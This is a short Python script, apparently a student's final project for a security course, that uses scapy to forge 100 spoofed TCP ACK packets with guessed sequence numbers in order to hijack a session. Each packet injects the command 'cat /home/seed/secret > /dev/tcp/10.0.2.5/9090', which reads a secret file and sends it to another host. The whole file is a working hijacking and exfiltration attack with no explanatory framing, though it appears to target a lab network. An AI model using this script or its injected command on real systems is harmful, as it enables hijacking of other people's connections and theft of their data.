"""
CS325 - final project

scapy module to initial a session hijacking

Jerry Lau
"""


import sys
from scapy.all import *
#import numpy as np
import random

# quick analysis of most common packet lenghts
numberList = [62,80,92]

for i in range(100):
	print("SENDING 1 SESSION HIJACKING PACKET")
	IPLayer = IP(src="169.54.104.71", dst="10.0.2.4")
	#sampleNum = random.choices(numberList, weights=(75,15,10), k=3)
	# no weighted random until py3.6
	# cannot import numpy either...
	sampleNum = random.choice(numberList)	
	seqCalc = sampleNum + i + 429269 #input wireshark seq
	num1 = random.randint(1000,10000)	
	ackNum = num1 + i + 112723130 #input wireshark ack
	
	#required to change ports
	TCPLayer = TCP(sport=443, dport=48962, flags="A", seq=seqCalc, ack=ackNum)
	Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.5/9090\r"
	pkt = IPLayer/TCPLayer/Data
	ls(pkt)
	send(pkt,verbose=0)

print("100 packets sent")
